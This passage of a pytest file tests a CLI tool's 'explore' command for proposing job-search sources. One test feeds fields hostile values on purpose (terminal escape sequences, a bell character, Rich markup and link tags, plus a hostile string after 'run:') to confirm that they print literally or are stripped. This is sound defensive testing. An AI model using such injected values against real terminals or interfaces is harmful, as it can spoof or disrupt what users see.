    assert " ✓ Added 2 sources  run: ijob search" in result.stdout
    assert "   cost $" in result.stderr


@pytest.mark.usefixtures("on_a_terminal")
def test_explore_asks_on_a_terminal(explore_world: _World) -> None:
    explore_world.interactive = True

    result = explore_world.explore(_INSTRUCTION, stdin="1\n")

    assert result.exit_code == 0, result.stderr
    assert " Add which?   1,2   all   none" in result.stdout
    assert " ✓ Added 1 source  run: ijob search" in result.stdout
    assert explore_world.has(_ACME)
    assert not explore_world.has(_ACME_TWO)


@pytest.mark.usefixtures("on_a_terminal")
def test_explore_none_found_says_so_on_a_terminal(explore_world: _World) -> None:
    explore_world.script([FINISH, _summary()])

    result = explore_world.explore(_INSTRUCTION, "--yes")

    assert result.exit_code == 0, result.stderr
    assert "no sources proposed" in result.stdout


@pytest.mark.usefixtures("on_a_terminal")
def test_explore_draws_third_party_text_literally(
    explore_world: _World, monkeypatch: pytest.MonkeyPatch
) -> None:
    hostile = _proposal(
        company="[red]Co[/red]\x1b[2J", why="[link=https://e.test]x[/link]\x07"
    )
    stop = ProviderFailedError(f"boom; run: {_HOSTILE}")
    _stub_explore(monkeypatch, replace(_explored(hostile), stop=stop), "provider")

    result = explore_world.explore(_INSTRUCTION, "--yes")

    assert "[red]Co[/red]" in result.stdout
    assert "[link=https://e.test]x[/link]" in result.stdout
    assert "\x1b" not in result.output
    assert "\x07" not in result.output


def test_explore_header_counts_known_and_no_source(
    explore_world: _World, monkeypatch: pytest.MonkeyPatch
) -> None:
    _stub_explore(monkeypatch, _explored(_proposal(), known=1, no_source=1))

    result = explore_world.explore(_INSTRUCTION, "--yes")

    assert result.stdout.splitlines()[0] == (
        "1 source proposed, 1 already known, 1 no source"
    )


def test_explore_help_lists_the_flags(explore_world: _World) -> None:
    result = CliRunner().invoke(explore_world.app(), ["explore", "--help"])

    text = _ANSI.sub("", result.output)
    assert result.exit_code == 0
    for flag in ("--model", "--yes", "--db", "--config"):
        assert flag in text
